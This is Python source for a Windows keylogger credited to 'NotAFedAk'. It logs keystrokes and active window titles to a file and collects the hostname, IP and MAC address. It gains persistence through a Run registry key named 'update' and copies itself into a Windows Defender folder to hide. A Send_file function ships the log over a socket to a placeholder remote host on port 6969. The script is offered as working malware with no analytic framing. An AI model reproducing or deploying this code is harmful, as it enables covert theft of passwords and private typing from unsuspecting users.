
#!/bin/env/python3
import socket # create connection and send file
import threading # loop the main file
import time # size for file
import shutil # copy file
from pynput import keyboard # loop it
from pynput.keyboard import Listener, Key # strokes
from datetime import date, datetime # for strokes
import os # see priv
import random # randomize file size to send out
import subprocess # run commands
import uuid # mac addr
import win32gui #unmark later for windows machines

#Made By NotAFedAk 


#Sys information

datetime = time.ctime(time.time())
hostname = socket.gethostname()    
ip = socket.gethostbyname(hostname)
#firewall = os.popen('netsh firewall show state & netsh firewall show config').read().rstrip()
#usr_priv = os.popen('whoami /priv').read().rstrip() 
mac_addr = hex(uuid.getnode())

os_info = {
    'hostname': hostname,
    'localip' : ip,
    'mac' : mac_addr,
}


def Win_persistance():
    try:
        subprocess.call(f'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V update /t REG_SZ /F /D {__file__}', shell=True) 
    except:
        pass 


def Move_file():
    #os.chdir(__file__)
    try:
        
        hidden_file = 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform'
        if __file__ in hidden_file:
            pass
        else:
            shutil.copyfile(__file__, hidden_file)
            
        #startup = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"  
    except:
        pass
        #shutil.move(__file__, 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform')


def Check_file():
    rand_ints = random.randint(6000, 6969)

    with open(hostname + '.txt', 'a+') as file:
        file.write(f'{os_info} [Start of log] \n' )
    
    
    
    while True:
        lookup = os.path.getsize(hostname +'.txt')
        time.sleep(2)
        print(lookup)

        if lookup > rand_ints: #Change to rand_ints later to randomize file size being sent 
        #Call function to send files asap
            print(f"More than {rand_ints} letters...")
            print("wew")
            #Send_file()

        #with open(hostname + '.txt', 'w+') as file:
            #pass
        

    
def Send_file():
    REMOTE_IP = "REMOTEIP"
    REMOTE_PORT = 6969 #PORT
    try:
        with open(hostname + '.txt', 'rb') as f:
            Info = f.read()

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((REMOTE_IP,REMOTE_PORT))
            s.send(Info)
            s.close()

        with open(hostname + '.txt', 'w'):
            pass

        Check_file()
    except:
        print("smthing went wrong while sending client data")
        pass


def window():
    time.sleep(5)
    old_app = ''
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        with open(hostname + '.txt', 'a+') as file:
            file.write(f'[{datetime}] ~{new_app}')
            #logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass

def Logging(key):
    

    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = "  "
        elif key == key.esc:
            current_key = " [ESC] "
        elif key == key.backspace:
            current_key = "[BKSP]"
        else:
            current_key = " " + str(key) + " "
    with open(hostname + '.txt', 'a+') as file:
        file.write(current_key)
    
    



def main():
    Move_file()
    Win_persistance()
    t1 = threading.Thread(target=Check_file)
    t2 = threading.Thread(target=window)
    t2.daemon = True
    t1.daemon = True
    t1.start()
    t2.start()
  
    with Listener(on_press=Logging) as listener:
        #Logged_data.append("\n")
        listener.join()



if __name__=='__main__':
    main()
